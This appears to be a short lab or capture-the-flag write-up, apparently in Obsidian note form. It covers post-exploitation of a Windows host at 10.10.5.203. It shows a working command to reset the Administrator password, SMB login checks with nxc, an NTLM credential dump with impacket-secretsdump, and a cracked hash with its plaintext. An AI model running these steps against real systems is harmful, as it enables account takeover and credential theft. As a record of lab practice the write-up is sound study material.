Running the publicly available exploit shows an error
![[Pasted image 20240819151756.png]]
`system()` has been disabled for security reasons. Shell commands can also be executed using `passthru()`

![[Pasted image 20240819152130.png]]
![[Pasted image 20240819152121.png]]

Changed `Administrator` passwrod
```cmd
net user Administrator Hacked@123
```

Verified the same using nxc
```bash
nxc smb 10.10.5.203 -u 'Administrator' -p 'Hacked@123'
```
![[Pasted image 20240819155744.png]]

Dumped NTLM hash for user `Lab`
```bash
impacket-secretsdump Administrator:'Hacked@123'@10.10.5.203 
```
![[Pasted image 20240819160012.png]]

Decrypted NTLM hash using https://crackstation.net
`30e87bf999828446a1c1209ddde4c450:googleplus`